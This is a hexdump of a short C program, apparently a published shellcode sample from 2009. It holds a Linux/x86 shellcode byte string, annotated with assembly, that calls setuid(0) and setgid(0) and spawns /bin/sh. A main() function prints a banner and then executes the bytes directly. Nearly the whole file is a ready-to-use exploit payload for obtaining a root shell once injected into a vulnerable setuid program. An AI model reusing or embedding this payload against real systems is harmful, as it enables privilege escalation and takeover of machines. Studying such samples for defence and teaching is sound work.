00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 0d 0a 63 6f  6e 73 74 20 63 68 61 72  |h>....const char|
00000020  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 3d 0d 0a 09  | shellcode[]=...|
00000030  22 5c 78 36 61 5c 78 31  37 22 09 09 2f 2f 20 70  |"\x6a\x17"..// p|
00000040  75 73 68 09 24 30 78 31  37 0d 0a 09 22 5c 78 35  |ush.$0x17..."\x5|
00000050  38 22 09 09 09 2f 2f 20  70 6f 70 09 25 65 61 78  |8"...// pop.%eax|
00000060  0d 0a 09 22 5c 78 33 31  5c 78 64 62 22 09 09 2f  |..."\x31\xdb"../|
00000070  2f 20 78 6f 72 09 25 65  62 78 2c 25 65 62 78 0d  |/ xor.%ebx,%ebx.|
00000080  0a 09 22 5c 78 63 64 5c  78 38 30 22 09 09 2f 2f  |.."\xcd\x80"..//|
00000090  20 69 6e 74 09 24 30 78  38 30 0d 0a 0d 0a 09 22  | int.$0x80....."|
000000a0  5c 78 62 30 5c 78 32 65  22 09 09 2f 2f 20 6d 6f  |\xb0\x2e"..// mo|
000000b0  76 09 24 30 78 32 65 2c  25 61 6c 0d 0a 09 22 5c  |v.$0x2e,%al..."\|
000000c0  78 63 64 5c 78 38 30 22  09 09 2f 2f 20 69 6e 74  |xcd\x80"..// int|
000000d0  09 24 30 78 38 30 0d 0a  0d 0a 09 22 5c 78 62 30  |.$0x80....."\xb0|
000000e0  5c 78 30 62 22 09 09 2f  2f 20 6d 6f 76 09 24 30  |\x0b"..// mov.$0|
000000f0  78 62 2c 25 61 6c 20 28  53 6f 20 79 6f 75 27 6c  |xb,%al (So you'l|
00000100  6c 20 67 65 74 20 73 65  67 66 61 75 6c 74 20 69  |l get segfault i|
00000110  66 20 69 74 27 73 20 6e  6f 74 20 61 62 6c 65 20  |f it's not able |
00000120  74 6f 0d 0a 64 6f 20 74  68 65 20 73 65 74 75 69  |to..do the setui|
00000130  64 28 30 29 2e 20 49 66  20 79 6f 75 20 64 6f 6e  |d(0). If you don|
00000140  27 74 20 77 61 6e 74 20  74 68 69 73 20 79 6f 75  |'t want this you|
00000150  20 63 61 6e 20 77 72 69  74 65 20 22 5c 78 36 61  | can write "\x6a|
00000160  5c 78 30 62 5c 78 35 38  22 0d 0a 69 6e 73 74 65  |\x0b\x58"..inste|
00000170  61 64 20 6f 66 20 22 5c  78 62 30 5c 78 30 62 22  |ad of "\xb0\x0b"|
00000180  2c 20 62 75 74 20 74 68  65 20 73 68 65 6c 6c 63  |, but the shellc|
00000190  6f 64 65 20 77 69 6c 6c  20 62 65 20 31 20 62 79  |ode will be 1 by|
000001a0  74 65 20 6c 6f 6e 67 65  72 0d 0a 09 22 5c 78 39  |te longer..."\x9|
000001b0  39 22 09 09 09 2f 2f 20  63 6c 74 64 0d 0a 09 22  |9"...// cltd..."|
000001c0  5c 78 35 32 22 09 09 09  2f 2f 20 70 75 73 68 09  |\x52"...// push.|
000001d0  25 65 64 78 0d 0a 09 22  5c 78 36 38 5c 78 32 66  |%edx..."\x68\x2f|
000001e0  5c 78 32 66 5c 78 37 33  5c 78 36 38 22 09 2f 2f  |\x2f\x73\x68".//|
000001f0  20 70 75 73 68 09 24 30  78 36 38 37 33 32 66 32  | push.$0x68732f2|
00000200  66 0d 0a 09 22 5c 78 36  38 5c 78 32 66 5c 78 36  |f..."\x68\x2f\x6|
00000210  32 5c 78 36 39 5c 78 36  65 22 09 2f 2f 20 70 75  |2\x69\x6e".// pu|
00000220  73 68 09 24 30 78 36 65  36 39 36 32 32 66 0d 0a  |sh.$0x6e69622f..|
00000230  09 22 5c 78 38 39 5c 78  65 33 22 09 09 2f 2f 20  |."\x89\xe3"..// |
00000240  6d 6f 76 09 25 65 73 70  2c 25 65 62 78 0d 0a 09  |mov.%esp,%ebx...|
00000250  22 5c 78 35 32 22 09 09  09 2f 2f 20 70 75 73 68  |"\x52"...// push|
00000260  09 25 65 64 78 0d 0a 09  22 5c 78 35 33 22 09 09  |.%edx..."\x53"..|
00000270  09 2f 2f 20 70 75 73 68  09 25 65 62 78 0d 0a 09  |.// push.%ebx...|
00000280  22 5c 78 38 39 5c 78 65  31 22 09 09 2f 2f 20 6d  |"\x89\xe1"..// m|
00000290  6f 76 09 25 65 73 70 2c  25 65 63 78 0d 0a 09 22  |ov.%esp,%ecx..."|
000002a0  5c 78 63 64 5c 78 38 30  22 3b 09 09 2f 2f 20 69  |\xcd\x80";..// i|
000002b0  6e 74 09 24 30 78 38 30  0d 0a 0d 0a 69 6e 74 20  |nt.$0x80....int |
000002c0  6d 61 69 6e 28 29 0d 0a  7b 0d 0a 09 70 72 69 6e  |main()..{...prin|
000002d0  74 66 09 28 22 5c 6e 5b  2b 5d 20 4c 69 6e 75 78  |tf.("\n[+] Linux|
000002e0  2f 78 38 36 20 73 65 74  75 69 64 28 30 29 2c 20  |/x86 setuid(0), |
000002f0  73 65 74 67 69 64 28 30  29 20 26 0d 0a 65 78 65  |setgid(0) &..exe|
00000300  63 76 65 28 2f 62 69 6e  2f 73 68 2c 5b 2f 62 69  |cve(/bin/sh,[/bi|
00000310  6e 2f 73 68 2c 4e 55 4c  4c 5d 29 22 0d 0a 09 09  |n/sh,NULL])"....|
00000320  22 5c 6e 5b 2b 5d 20 44  61 74 65 3a 20 32 33 2f  |"\n[+] Date: 23/|
00000330  30 36 2f 32 30 30 39 22  0d 0a 09 09 22 5c 6e 5b  |06/2009"...."\n[|
00000340  2b 5d 20 41 75 74 68 6f  72 3a 20 54 68 65 57 6f  |+] Author: TheWo|
00000350  72 6d 22 0d 0a 09 09 22  5c 6e 5c 6e 5b 2b 5d 20  |rm"...."\n\n[+] |
00000360  53 68 65 6c 6c 63 6f 64  65 20 53 69 7a 65 3a 20  |Shellcode Size: |
00000370  25 64 20 62 79 74 65 73  5c 6e 5c 6e 22 2c 20 73  |%d bytes\n\n", s|
00000380  69 7a 65 6f 66 28 73 68  65 6c 6c 63 6f 64 65 29  |izeof(shellcode)|
00000390  2d 31 29 3b 0d 0a 09 28  2a 28 76 6f 69 64 20 28  |-1);...(*(void (|
000003a0  2a 29 28 29 29 20 73 68  65 6c 6c 63 6f 64 65 29  |*)()) shellcode)|
000003b0  28 29 3b 0d 0a 09 72 65  74 75 72 6e 20 30 3b 0d  |();...return 0;.|
000003c0  0a 7d                                             |.}|
000003c2
